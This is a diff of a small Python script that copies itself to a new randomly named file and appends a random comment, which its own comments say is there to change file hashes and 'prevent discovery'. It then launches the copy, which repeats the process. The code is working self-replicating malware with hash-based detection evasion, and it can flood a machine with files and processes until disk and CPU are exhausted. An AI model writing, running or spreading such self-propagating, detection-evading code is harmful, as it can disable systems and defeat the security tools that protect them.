@@ -7,37 +7,46 @@ Created on Wed Jun 28 22:16:15 2023
 """
 
 import os
-import sys
 from threading import Thread
-from pathlib import Path
-from base64 import b64encode
+import sys
 import random
 import string
 
-print(Path.cwd())
-
-print(os.path.basename(__file__))
+#get the current file
 thisfile = os.path.basename(__file__)
+
+#open up the file and read it
 f = open(thisfile, "r")
 lines = f.readlines()
 
+#Create the new file and include a different name
 filename = "newpython{randomness}.py".format(randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
 
+#start copying the contents of the files to the new one
 g = open(filename, "w")
+
 count = len(lines)
-start = 0 
+start = 0
 for line in lines:
     start = start + 1
+    #we dont want to copy the random string added to the end
     if start == (count - 1):
         break
     g.write(line)
 
+#add the string at the end to change hash files and prevent discovery
 g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
+
+#always closing everything
 g.close()
 f.close()
 
+#run the newly created file
 def runFunc():
     os.system('python3 ' + filename)
 
 thread = Thread(target=runFunc)
 thread.start()
+
+#Ensure this thread gets closed
+sys.exit()
